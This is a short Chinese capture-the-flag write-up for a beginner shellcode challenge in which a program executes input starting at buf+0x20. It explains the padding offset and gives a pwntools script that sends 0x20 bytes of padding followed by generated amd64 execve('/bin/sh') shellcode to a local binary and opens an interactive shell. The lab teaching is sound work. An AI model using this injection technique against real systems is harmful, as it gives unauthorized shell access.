# week1WTF？Shellcode！

## 题目简述

程序读入一段数据后，将 `buf+0x20` 当作函数入口执行。题目环境允许该缓冲区中的机器码执行，因此只需在前 0x20 字节放置填充，再写入 amd64 `execve("/bin/sh", ...)` Shellcode。

## 解题过程

控制流不是从 `buf` 开始，而是从 `buf+0x20` 开始。若直接把 Shellcode 放在输入开头，CPU 会从中间位置进入并把指令解释错位；因此先精确填充 `0x20` 字节。

使用 pwntools 根据目标架构生成 Shellcode，避免复制来源不明、架构不匹配的字节串：

```python
from pwn import *

context.clear(arch="amd64", os="linux")
io = process("./main")

shellcode = asm(shellcraft.sh())
payload = b"\x00" * 0x20 + shellcode

io.recvline()
io.send(payload)
io.interactive()
```

生成的机器码最终调用 `execve("/bin/sh", 0, 0)`。进入交互后即可读取 flag。

## 方法总结

本题的关键是确认三件事：目标架构为 amd64、输入缓冲区可执行、实际跳转入口比缓冲区起点高 `0x20`。Shellcode 题不能只关注字节内容，还要核对入口偏移、坏字符和 NX/内存权限。
